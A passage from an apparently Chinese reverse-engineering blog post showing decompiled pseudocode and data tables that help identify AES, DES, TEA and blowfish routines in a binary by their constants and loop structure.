[rbp+1A0h]</span></span><br><span class="line">  _DWORD *v14; <span class="comment">// [rsp+1D0h] [rbp+1B0h]</span></span><br><span class="line"></span><br><span class="line">  v14 = a3;</span><br><span class="line">  v13 = a1;</span><br><span class="line">  v3 = &amp;v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">106</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v3 = <span class="number">-858993460</span>;</span><br><span class="line">    v3 = (__int64 *)((<span class="keyword">char</span> *)v3 + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  un_use((__int64)&amp;unk_7FF6D92E4002);</span><br><span class="line">  v7 = v14;</span><br><span class="line">  v8 = v14 + <span class="number">44</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j )</span><br><span class="line">    v7[j] = _byteswap_ulong(*(_DWORD *)(<span class="number">4</span> * j + v13));</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">10</span>; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    v7[<span class="number">4</span>] = dword_7FF6D893EBB0[k] ^ S_box[(<span class="keyword">unsigned</span> __int16)(v7[<span class="number">3</span>] &gt;&gt; <span class="number">16</span>) &gt;&gt; <span class="number">16</span>] ^ (S_box[v7[<span class="number">3</span>] &amp; <span class="number">0xFF</span>] &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xFF00</span> ^ (S_box[(v7[<span class="number">3</span>] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>] &lt;&lt; <span class="number">16</span>) &amp; <span class="number">0xFF0000</span> ^ (S_box[(v7[<span class="number">3</span>] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>] &lt;&lt; <span class="number">24</span>) &amp; <span class="number">0xFF000000</span> ^ *v7;</span><br><span class="line">    v7[<span class="number">5</span>] = v7[<span class="number">4</span>] ^ v7[<span class="number">1</span>];</span><br><span class="line">    v7[<span class="number">6</span>] = v7[<span class="number">5</span>] ^ v7[<span class="number">2</span>];</span><br><span class="line">    v7[<span class="number">7</span>] = v7[<span class="number">6</span>] ^ v7[<span class="number">3</span>];</span><br><span class="line">    v7 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = v14 + <span class="number">40</span>;</span><br><span class="line">  <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; <span class="number">11</span>; ++l )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; <span class="number">4</span>; ++m )</span><br><span class="line">      v8[m] = v7[m];</span><br><span class="line">    v7 -= <span class="number">4</span>;</span><br><span class="line">    v8 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>特征:AES的S_box:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:00007FF6D8942000 S_box           db 63h, 7Ch, 77h, 7Bh, 0F2h, 6Bh, 6Fh, 0C5h, 30h, 1, 67h</span><br><span class="line">.data:00007FF6D8942000                                         ; DATA XREF: sub_7FF6D89349E0+180↑o</span><br><span class="line">.data:00007FF6D8942000                                         ; sub_7FF6D89349E0+1B0↑o ...</span><br><span class="line">.data:00007FF6D8942000                 db 2Bh, 0FEh, 0D7h, 0ABh, 76h, 0CAh, 82h, 0C9h, 7Dh, 0FAh</span><br><span class="line">.data:00007FF6D8942000                 db 59h, 47h, 0F0h, 0ADh, 0D4h, 0A2h, 0AFh, 9Ch, 0A4h, 72h</span><br><span class="line">.data:00007FF6D8942000                 db 0C0h, 0B7h, 0FDh, 93h, 26h, 36h, 3Fh, 0F7h, 0CCh, 34h</span><br><span class="line">.data:00007FF6D8942000                 db 0A5h, 0E5h, 0F1h, 71h, 0D8h, 31h, 15h, 4, 0C7h, 23h</span><br><span class="line">.data:00007FF6D8942000                 db 0C3h, 18h, 96h, 5, 9Ah, 7, 12h, 80h, 0E2h, 0EBh, 27h</span><br><span class="line">.data:00007FF6D8942000                 db 0B2h, 75h, 9, 83h, 2Ch, 1Ah, 1Bh, 6Eh, 5Ah, 0A0h, 52h</span><br><span class="line">.data:00007FF6D8942000                 db 3Bh, 0D6h, 0B3h, 29h, 0E3h, 2Fh, 84h, 53h, 0D1h, 0</span><br><span class="line">.data:00007FF6D8942000                 db 0EDh, 20h, 0FCh, 0B1h, 5Bh, 6Ah, 0CBh, 0BEh, 39h, 4Ah</span><br><span class="line">.data:00007FF6D8942000                 db 4Ch, 58h, 0CFh, 0D0h, 0EFh, 0AAh, 0FBh, 43h, 4Dh, 33h</span><br><span class="line">.data:00007FF6D8942000                 db 85h, 45h, 0F9h, 2, 7Fh, 50h, 3Ch, 9Fh, 0A8h, 51h, 0A3h</span><br><span class="line">.data:00007FF6D8942000                 db 40h, 8Fh, 92h, 9Dh, 38h, 0F5h, 0BCh, 0B6h, 0DAh, 21h</span><br><span class="line">.data:00007FF6D8942000                 db 10h, 0FFh, 0F3h, 0D2h, 0CDh, 0Ch, 13h, 0ECh, 5Fh, 97h</span><br><span class="line">.data:00007FF6D8942000                 db 44h, 17h, 0C4h, 0A7h, 7Eh, 3Dh, 64h, 5Dh, 19h, 73h</span><br><span class="line">.data:00007FF6D8942000                 db 60h, 81h, 4Fh, 0DCh, 22h, 2Ah, 90h, 88h, 46h, 0EEh</span><br><span class="line">.data:00007FF6D8942000                 db 0B8h, 14h, 0DEh, 5Eh, 0Bh, 0DBh, 0E0h, 32h, 3Ah, 0Ah</span><br><span class="line">.data:00007FF6D8942000                 db 49h, 6, 24h, 5Ch, 0C2h, 0D3h, 0ACh, 62h, 91h, 95h, 0E4h</span><br><span class="line">.data:00007FF6D8942000                 db 79h, 0E7h, 0C8h, 37h, 6Dh, 8Dh, 0D5h, 4Eh, 0A9h, 6Ch</span><br><span class="line">.data:00007FF6D8942000                 db 56h, 0F4h, 0EAh, 65h, 7Ah, 0AEh, 8, 0BAh, 78h, 25h</span><br><span class="line">.data:00007FF6D8942000                 db 2Eh, 1Ch, 0A6h, 0B4h, 0C6h, 0E8h, 0DDh, 74h, 1Fh, 4Bh</span><br><span class="line">.data:00007FF6D8942000                 db 0BDh, 8Bh, 8Ah, 70h, 3Eh, 0B5h, 66h, 48h, 3, 0F6h, 0Eh</span><br><span class="line">.data:00007FF6D8942000                 db 61h, 35h, 57h, 0B9h, 86h, 0C1h, 1Dh, 9Eh, 0E1h, 0F8h</span><br><span class="line">.data:00007FF6D8942000                 db 98h, 11h, 69h, 0D9h, 8Eh, 94h, 9Bh, 1Eh, 87h, 0E9h</span><br><span class="line">.data:00007FF6D8942000                 db 0CEh, 55h, 28h, 0DFh, 8Ch, 0A1h, 89h, 0Dh, 0BFh, 0E6h</span><br><span class="line">.data:00007FF6D8942000                 db 42h, 68h, 41h, 99h, 2Dh, 0Fh, 0B0h, 54h, 0BBh, 16h</span><br></pre></td></tr></table></figure><h3 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_7FF6D89324E0</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [rsp+48h] [rbp+28h]</span></span><br><span class="line">  __int64 *input; <span class="comment">// [rsp+140h] [rbp+120h]</span></span><br><span class="line">  __int64 key; <span class="comment">// [rsp+148h] [rbp+128h]</span></span><br><span class="line"></span><br><span class="line">  key = a2;</span><br><span class="line">  input = (__int64 *)a1;</span><br><span class="line">  v2 = &amp;v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">74</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">-858993460</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  un_use((__int64)&amp;unk_7FF6D92E4002);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">8u</span>i64);</span><br><span class="line">  pad((__int64)input, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Size, <span class="number">8</span>i64);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Size / <span class="number">8</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    j_memset(&amp;Dst, <span class="number">0</span>, <span class="number">8u</span>i64);</span><br><span class="line">    DES((__int64)&amp;input[j], key, (__int64)&amp;Dst);</span><br><span class="line">    j_memcpy(&amp;input[j], &amp;Dst, <span class="number">8u</span>i64);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_7FF6D8931447((__int64)&amp;v5, (__int64)&amp;unk_7FF6D893F6B0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入DES:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">DES</span><span class="params">(__int64 input_0, __int64 key_0, __int64 src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v7[<span class="number">72</span>]; <span class="comment">// [rsp+30h] [rbp+10h]</span></span><br><span class="line">  <span class="keyword">int</span> v8[<span class="number">72</span>]; <span class="comment">// [rsp+150h] [rbp+130h]</span></span><br><span class="line">  <span class="keyword">char</span> v9[<span class="number">3104</span>]; <span class="comment">// [rsp+270h] [rbp+250h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+E90h] [rbp+E70h]</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [rsp+FB0h] [rbp+F90h]</span></span><br><span class="line">  <span class="keyword">char</span> v12[<span class="number">2208</span>]; <span class="comment">// [rsp+10D0h] [rbp+10B0h]</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">2208</span>]; <span class="comment">// [rsp+1970h] [rbp+1950h]</span></span><br><span class="line">  <span class="keyword">int</span> v14[<span class="number">69</span>]; <span class="comment">// [rsp+2210h] [rbp+21F0h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+2324h] [rbp+2304h]</span></span><br><span class="line">  <span class="keyword">int</span> k; <span class="comment">// [rsp+2344h] [rbp+2324h]</span></span><br><span class="line">  <span class="keyword">int</span> l; <span class="comment">// [rsp+2364h] [rbp+2344h]</span></span><br><span class="line">  <span class="keyword">int</span> m; <span class="comment">// [rsp+2384h] [rbp+2364h]</span></span><br><span class="line">  <span class="keyword">int</span> n; <span class="comment">// [rsp+23A4h] [rbp+2384h]</span></span><br><span class="line">  <span class="keyword">int</span> ii; <span class="comment">// [rsp+23C4h] [rbp+23A4h]</span></span><br><span class="line">  <span class="keyword">char</span> *v21; <span class="comment">// [rsp+29D8h] [rbp+29B8h]</span></span><br><span class="line">  __int64 input; <span class="comment">// [rsp+2A10h] [rbp+29F0h]</span></span><br><span class="line">  __int64 key; <span class="comment">// [rsp+2A18h] [rbp+29F8h]</span></span><br><span class="line">  __int64 v24; <span class="comment">// [rsp+2A20h] [rbp+2A00h]</span></span><br><span class="line"></span><br><span class="line">  v24 = src;</span><br><span class="line">  key = key_0;</span><br><span class="line">  input = input_0;</span><br><span class="line">  v3 = &amp;v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">2686</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v3 = <span class="number">-858993460</span>;</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  un_use((__int64)&amp;unk_7FF6D92E4002);</span><br><span class="line">  <span class="built_in">memset</span>(v7, <span class="number">0</span>, <span class="number">0x100</span>ui64);</span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="number">0x100</span>ui64);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v10, <span class="number">0</span>, <span class="number">0x100</span>ui64);</span><br><span class="line">  <span class="built_in">memset</span>(v14, <span class="number">0</span>, <span class="number">0x100</span>ui64);</span><br><span class="line">  sub_7FF6D8931087(input, (__int64)&amp;v10, <span class="number">8</span>i64);</span><br><span class="line">  sub_7FF6D8931096((__int64)&amp;v10, (__int64)v7, (__int64)DES_Sbox);</span><br><span class="line">  sub_7FF6D8931087(key, (__int64)&amp;v11, <span class="number">8</span>i64);</span><br><span class="line">  sub_7FF6D893140B((__int64)&amp;v11, (__int64)v9);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">32</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)&amp;v12[<span class="number">4</span> * j] = v7[j];</span><br><span class="line">    *(_DWORD *)&amp;v13[<span class="number">4</span> * j] = v7[j + <span class="number">32</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">1</span>; k &lt; <span class="number">16</span>; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; <span class="number">32</span>; ++l )</span><br><span class="line">      *(_DWORD *)&amp;v12[<span class="number">128</span> * (<span class="keyword">signed</span> __int64)k + <span class="number">4</span> * l] = *(_DWORD *)&amp;v13[<span class="number">128</span> * (<span class="keyword">signed</span> __int64)(k - <span class="number">1</span>) + <span class="number">4</span> * l];</span><br><span class="line">    v21 = &amp;v13[<span class="number">128</span> * (<span class="keyword">signed</span> __int64)(k - <span class="number">1</span>)];</span><br><span class="line">    sub_7FF6D89311D1(</span><br><span class="line">      (__int64)&amp;v13[<span class="number">128</span> * (<span class="keyword">signed</span> __int64)(k - <span class="number">1</span>)],      (__int64)&amp;v13[<span class="number">128</span> * (<span class="keyword">signed</span> __int64)k],      (__int64)&amp;v9[<span class="number">192</span> * (k - <span class="number">1</span>)]);</span><br><span class="line">    sub_7FF6D893107D(&amp;v13[<span class="number">128</span> * (<span class="keyword">signed</span> __int64)k], &amp;v12[<span class="number">128</span> * (<span class="keyword">signed</span> __int64)(k - <span class="number">1</span>)], <span class="number">32</span>i64);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; <span class="number">32</span>; ++m )</span><br><span class="line">    *(_DWORD *)&amp;v13[<span class="number">4</span> * m + <span class="number">2048</span>] = *(_DWORD *)&amp;v13[<span class="number">4</span> * m + <span class="number">1920</span>];</span><br><span class="line">  v21 = &amp;v13[<span class="number">1920</span>];</span><br><span class="line">  sub_7FF6D89311D1((__int64)&amp;v13[<span class="number">1920</span>], (__int64)&amp;v12[<span class="number">2048</span>], (__int64)&amp;v9[<span class="number">2880</span>]);</span><br><span class="line">  sub_7FF6D893107D(&amp;v12[<span class="number">2048</span>], &amp;v12[<span class="number">1920</span>], <span class="number">32</span>i64);</span><br><span class="line">  <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; <span class="number">32</span>; ++m )</span><br><span class="line">  &#123;</span><br><span class="line">    v8[m] = *(_DWORD *)&amp;v12[<span class="number">4</span> * m + <span class="number">2048</span>];</span><br><span class="line">    v8[m + <span class="number">32</span>] = *(_DWORD *)&amp;v13[<span class="number">4</span> * m + <span class="number">2048</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  sub_7FF6D89313C0(v8, v14, &amp;unk_7FF6D8942340);</span><br><span class="line">  <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt; <span class="number">8</span>; ++n )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt; <span class="number">8</span>; ++ii )</span><br><span class="line">    &#123;</span><br><span class="line">      v21 = (<span class="keyword">char</span> *)(ii + <span class="number">8</span> * n);</span><br><span class="line">      *(_BYTE *)(v24 + n) |= LOBYTE(v14[(_QWORD)v21]) &lt;&lt; (<span class="number">7</span> - ii);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_7FF6D8931447((__int64)&amp;v6, (__int64)&amp;unk_7FF6D893F5D0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DES置换规则:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:00007FF6D8942100 DES_Sbox        dd 58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20</span><br><span class="line">.data:00007FF6D8942100                                         ; DATA XREF: DES+B9↑o</span><br><span class="line">.data:00007FF6D8942100                 dd 12, 4, 62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40</span><br><span class="line">.data:00007FF6D8942100                 dd 32, 24, 16, 8, 57, 49, 41, 33, 25, 17, 9, 1, 59, 51</span><br><span class="line">.data:00007FF6D8942100                 dd 43, 35, 27, 19, 11, 3, 61, 53, 45, 37, 29, 21, 13, 5</span><br><span class="line">.data:00007FF6D8942100                 dd 63, 55, 47, 39, 31, 23, 15, 7</span><br></pre></td></tr></table></figure><h3 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_7FF6D8934070</span><span class="params">(__int64 input_0, __int64 key_1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  __int64 *input; <span class="comment">// [rsp+120h] [rbp+100h]</span></span><br><span class="line">  __int64 key; <span class="comment">// [rsp+128h] [rbp+108h]</span></span><br><span class="line"></span><br><span class="line">  key = key_1;</span><br><span class="line">  input = (__int64 *)input_0;</span><br><span class="line">  v2 = &amp;v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">66</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">-858993460</span>;</span><br><span class="line">    v2 = (__int64 *)((<span class="keyword">char</span> *)v2 + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  un_use((__int64)&amp;unk_7FF6D92E4002);</span><br><span class="line">  pad((__int64)input, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Size, <span class="number">8</span>i64);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Size / <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> ( j &gt;= (<span class="keyword">unsigned</span> <span class="keyword">int</span>)result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    TEA_0((__int64)&amp;input[j], key);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入TEA_0:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">sub_7FF6D8934650</span><span class="params">(<span class="keyword">int</span> *input_0, <span class="keyword">int</span> *key_0)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">double</span> v4; <span class="comment">// xmm0_8</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="keyword">int</span> sum; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line">  <span class="keyword">int</span> delta; <span class="comment">// [rsp+A4h] [rbp+84h]</span></span><br><span class="line">  <span class="keyword">double</span> v12; <span class="comment">// [rsp+C8h] [rbp+A8h]</span></span><br><span class="line">  <span class="keyword">int</span> k_0; <span class="comment">// [rsp+E4h] [rbp+C4h]</span></span><br><span class="line">  <span class="keyword">int</span> k_1; <span class="comment">// [rsp+104h] [rbp+E4h]</span></span><br><span class="line">  <span class="keyword">int</span> k_2; <span class="comment">// [rsp+124h] [rbp+104h]</span></span><br><span class="line">  <span class="keyword">int</span> k_3; <span class="comment">// [rsp+144h] [rbp+124h]</span></span><br><span class="line">  <span class="keyword">int</span> *input; <span class="comment">// [rsp+240h] [rbp+220h]</span></span><br><span class="line">  <span class="keyword">int</span> *key; <span class="comment">// [rsp+248h] [rbp+228h]</span></span><br><span class="line"></span><br><span class="line">  key = key_0;</span><br><span class="line">  input = input_0;</span><br><span class="line">  v2 = &amp;v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">138</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">-858993460</span>;</span><br><span class="line">    v2 = (__int64 *)((<span class="keyword">char</span> *)v2 + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  un_use((__int64)&amp;unk_7FF6D92E4002);</span><br><span class="line">  v7 = *input;</span><br><span class="line">  v8 = input[<span class="number">1</span>];</span><br><span class="line">  sum = <span class="number">0</span>;</span><br><span class="line">  v4 = j_sqrt(<span class="number">5.0</span>);</span><br><span class="line">  v12 = <span class="built_in">floor</span>((v4 - <span class="number">1.0</span>) * <span class="number">2147483648.0</span>);       <span class="comment">// 特征1:2654435769</span></span><br><span class="line">  delta = (<span class="keyword">signed</span> <span class="keyword">int</span>)v12;</span><br><span class="line">  k_0 = *key;</span><br><span class="line">  k_1 = key[<span class="number">1</span>];</span><br><span class="line">  k_2 = key[<span class="number">2</span>];</span><br><span class="line">  k_3 = key[<span class="number">3</span>];</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">32</span>; ++j ) <span class="comment">//特征2</span></span><br><span class="line">  &#123;</span><br><span class="line">    sum += delta;</span><br><span class="line">    v7 += (k_1 + (v8 &gt;&gt; <span class="number">5</span>)) ^ (sum + v8) ^ (k_0 + <span class="number">16</span> * v8);</span><br><span class="line">    v8 += (k_3 + (v7 &gt;&gt; <span class="number">5</span>)) ^ (sum + v7) ^ (k_2 + <span class="number">16</span> * v7);</span><br><span class="line">  &#125;</span><br><span class="line">  *input = v7;</span><br><span class="line">  result = <span class="number">4</span>i64;</span><br><span class="line">  input[<span class="number">1</span>] = v8;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="blowfish"><a href="#blowfish" class="headerlink" title="blowfish"></a>blowfish</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">blowfish_0</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *input_0, __int64 key_1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *v10; <span class="comment">// [rsp+68h] [rbp+48h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> Long; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// [rsp+A4h] [rbp+84h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *input; <span class="comment">// [rsp+1A0h] [rbp+180h]</span></span><br><span class="line">  __int64 key; <span class="comment">// [rsp+1A8h] [rbp+188h]</span></span><br><span class="line"></span><br><span class="line">  key = key_1;</span><br><span class="line">  input = input_0;</span><br><span class="line">  v2 = &amp;v7;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">98</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">-858993460</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  un_use((__int64)&amp;unk_7FF6D92E4002);</span><br><span class="line">  v9 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Size / <span class="number">8</span>;</span><br><span class="line">  v10 = input;</span><br><span class="line">  sub_7FF6D893132A(key, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Size % <span class="number">8u</span>i64);<span class="comment">//密钥扩展</span></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v9; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    Long = j__byteswap_ulong(*v10);</span><br><span class="line">    v12 = j__byteswap_ulong(v10[<span class="number">1</span>]);</span><br><span class="line">    sub_7FF6D893145B((__int64)&amp;Long, (__int64)&amp;v12);</span><br><span class="line">    v4 = j__byteswap_ulong(Long);</span><br><span class="line">    *v10 = v4;</span><br><span class="line">    v5 = j__byteswap_ulong(v12);</span><br><span class="line">    v10[<span class="number">1</span>] = v5;</span><br><span class="line">    v10 += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_7FF6D8931447((__int64)&amp;v7, (__int64)&amp;unk_7FF6D893F860);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall sub_7FF6D8932710(char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  char *v1; // rdi</span><br><span class="line">  signed __int64 i; // rcx</span><br><span class="line">  unsigned <span class="built_in">int</span> v3; // eax</span><br><span class="line">  char v5; // [rsp+0h] [rbp-20h]</span><br><span class="line">  <span class="built_in">int</span> j; // [rsp+24h] [rbp+4h]</span><br><span class="line">  <span class="built_in">int</span> k; // [rsp+44h] [rbp+24h]</span><br><span class="line">  <span class="built_in">int</span> v8; // [rsp+64h] [rbp+44h]</span><br><span class="line">  void *Dst; // [rsp+88h] [rbp+68h]</span><br><span class="line">  <span class="built_in">int</span> v10; // [rsp+A4h] [rbp+84h]</span><br><span class="line">  <span class="built_in">int</span> v11; // [rsp+C4h] [rbp+A4h]</span><br><span class="line">  __int64 v12; // [rsp+198h] [rbp+178h]</span><br><span class="line">  const char *Str; // [rsp+1D0h] [rbp+1B0h]</span><br><span class="line"></span><br><span class="line">  Str = a1;</span><br><span class="line">  v1 = &amp;v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = 110i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v1 = -<span class="number">858993460</span>;</span><br><span class="line">    v1 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  un_use((__int64)&amp;unk_7FF6D92E4002);</span><br><span class="line">  v8 = j_strlen(Str);</span><br><span class="line">  Dst = 0i64;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  Dst = malloc(v8);</span><br><span class="line">  j_memset(Dst, <span class="number">0</span>, v8);</span><br><span class="line">  v8 /= 4ui64;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v8; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = j__byteswap_ulong(*(_DWORD *)&amp;Str[<span class="number">4</span> * j]);</span><br><span class="line">    *((_DWORD *)Dst + j) = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">18</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = 